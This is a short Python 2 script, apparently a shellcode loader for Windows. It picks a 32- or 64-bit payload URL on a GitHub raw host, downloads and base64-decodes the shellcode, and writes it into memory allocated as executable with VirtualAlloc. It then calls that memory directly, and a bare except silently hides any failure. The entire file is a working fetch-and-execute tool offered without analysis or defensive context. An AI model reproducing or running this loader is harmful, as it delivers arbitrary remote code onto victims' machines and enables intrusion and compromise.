import urllib2
import platform
import ctypes
import base64

url32 = "https://raw.githubusercontent.com/MickyTh/shellcode/main/win32.bin"
url64 = "https://raw.githubusercontent.com/MickyTh/shellcode/main/win64.bin"
shellcode = ""
def run(*args):
	try:
		check = platform.architecture()
		if "32" in str(check):
			response = urllib2.urlopen(url32)
			shellcode = base64.b64decode(response.read())
		else:
			response = urllib2.urlopen(url64)
			shellcode = base64.b64decode(response.read())

		buffer = ctypes.create_string_buffer(shellcode)
		length = len(buffer)

		ptr = ctypes.windll.kernel32.VirtualAlloc(None, length, 0x1000 | 0x2000, 0x40)
		ctypes.windll.kernel32.RtlMoveMemory(ptr, buffer, length)
		shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
		shell_func()
	except:
		pass
